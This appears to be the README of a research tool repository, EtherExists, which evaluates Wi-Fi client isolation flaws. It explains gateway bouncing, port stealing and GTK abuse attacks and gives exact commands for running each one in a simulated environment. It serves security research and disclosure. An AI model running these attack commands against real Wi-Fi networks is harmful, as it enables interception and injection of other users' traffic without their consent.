# EtherExists: Demystifying and Breaking Client Isolation in Wi-Fi Networks

## 1. Introduction

This repo contains EtherExists, a set of tools to evaluate Wi-Fi networks for client isolation flaws within the Wi-Fi standards and concrete implementations. Our attacks can inject/write and intercept/read Wi-Fi frames over the wireless medium in a way that bypasses AP-enforced client isolation and Wi-Fi encryption, enabling unintended connectivity and/or MitM attacks between otherwise separated clients. These vulnerabilities affect worldwide Wi-Fi deployments with malicious outsiders/insiders, where our techniques can break client isolation to achieve Man-in-the-Middle for all WPA versions, i.e., from WEP up to WPA2/WPA3, and for all personal and even enterprise networks. Some attack variants allow breaking the isolation between guest networks and main networks.

The root cause of these flaws is that Wi-Fi client isolation, as deployed today, is not properly standard and therefore not consistently enforced. We hope out works encourages a more standardized and consistent approach to client isolation accross Wi-Fi vendors.

This codebase builds upon the public repository [macstealer](https://github.com/vanhoefm/macstealer/) and provides a simulated Wi-Fi environment to confirm Functionality of our main attack techniques.


## 2. Overview of Main Attack Techniques

We give a brief summary of the attack techniques that can be evaluated for Functionality using the simulated Wi-Fi environment we created:

1. **Gateway Bouncing**: Layer-2 isolation is nullified if the gateway forwards IP packets between clients. An attacker sends packets with the victim’s IP but the gateway’s MAC as the L2 destination; the gateway “bounces” them back to the victim, enabling client-to-client injection via Layer-3 routing.

2. **Port Stealing** (across Virtual BSSIDs): By authenticating with the victim’s MAC address on a different BSSID, the attacker poisons the AP’s MAC-to-port mapping so that victim traffic is encrypted with the attacker’s PTK. This can also be used with spoofed gateway MACs to capture uplink traffic from all clients. In some cases, WPA-protected traffic is leaked in plaintext.

3. **Abusing GTK**: Wrapping unicast traffic inside broadcast/multicast frames encrypted with the Group Temporal Key lets an attacker inject packets directly to victims, bypassing AP forwarding rules. GTKs often remain valid long after client disconnection.


# 3. Usage

Our scripts were tested on **Ubuntu 22.04.5 LTS**. To easily test the below scripts, we therefore strongly recommend to **download and install [Ubuntu 22.04](https://releases.ubuntu.com/jammy/) in a Virtual Machine** such as [VirtualBox](https://www.virtualbox.org/wiki/Downloads), and then executing the below commands.

## 3.1. Initialization

The following steps only need to be executed once to initialize the repository and to compile the necessary executables on your machine. First, install the necessary dependencies:

	sudo apt update
	sudo apt install libnl-3-dev libnl-genl-3-dev libnl-route-3-dev \
	libssl-dev libdbus-1-dev pkg-config build-essential net-tools python3-venv \
	aircrack-ng rfkill git dnsmasq tcpreplay macchanger

Next, clone this repository, and run the following script in the root directory of the repository to compile our modified hostap release:

	./setup.sh
	cd macstealer/research
	./build.sh
	./pysetup.sh

<a id="id-repeatable"></a>
## 3.2. Repeatable Instructions

	cd macstealer/research
	sudo su
	source venv/bin/activate


## 3.3. Gateway Bouncing

First, **reboot** if you previously ran another experiment, to ensure the network configuration is reset back to normal. Next, follow the [repeatable instructions](#id-repeatable) in two terminals. Then in the first terminal, from the root directory of the repository, execute:

	cd setup
	./setup-br0-gwbounce.sh

In the other terminal, now execute:

	python3 macstealer.py wlan2 --c2c-ip wlan3 --other-bss --no-ssid-check --config client-simulated-AE-gatewaybouncing.conf

The attack is successful if the following output in red is shown:

	>>> Client to client traffic at IP layer is allowed (PSK{passphrase_atkr} to SAE{passphrase_victim})


## 3.4. Port Stealing

First, **reboot** if you previously ran another experiment, to ensure the network configuration is reset back to normal. Next, follow the [repeatable instructions](#id-repeatable) in two terminals. Then in the first terminal, from the root directory of the repository, execute:

	cd setup
	./setup-br0-portsteal.sh

In the other terminal, now execute:

	python3 macstealer.py wlan2 --c2c-port-steal wlan3 --other-bss --no-ssid-check --config client-simulated-AE-portsteal.conf --server 192.168.100.1

The attack is successful if the following output in red is shown:

	>>> Downlink port stealing is successful.


## 3.5. GTK Abuse

First, **reboot** if you previously ran another experiment, to ensure the network configuration is reset back to normal. Next, follow the [repeatable instructions](#id-repeatable) in two terminals. Then in the first terminal, from the root directory of the repository, execute:

	cd setup
	./setup-br0-gtkabuse.sh

In the other terminal, now execute the first attack variant:

	python3 macstealer.py wlan2 --c2c-gtk-inject wlan3 --other-bss --no-ssid-check --config client-simulated-AE-gtkabuse.conf --no-id-check --c2m-mon-channel 6

The attack is successful if the following output in red is shown:

	>>> GTK wrapping ICMP ping is allowed (SAE{passphrase_victim} to SAE{passphrase_victim}).

Next, press CTRL+C to terminate the macstealer.py script, and now execute the second attack variant:

	python3 macstealer.py wlan2 --c2c-gtk-inject wlan3 --other-bss --no-ssid-check --config client-simulated-AE-gtkabuse2.conf --no-id-check --c2m-mon-channel 1

The attack is successful if the following output in red is shown:

	>>> GTK wrapping ICMP ping is allowed (PSK{passphrase_atkr} to PSK{passphrase_atkr}).


# 4. Troubleshooting

- When using Ubuntu 22.04 on VirtualBox 7 or higher, we noticed that the terminal may not properly start after installation. To fix this, follow [these steps](https://askubuntu.com/questions/1435918/terminal-not-opening-on-ubuntu-22-04-on-virtual-box-7-0-0). Alternatively, when installing Ubuntu 22.04, check/enable the option "Skip Unattended Installation".

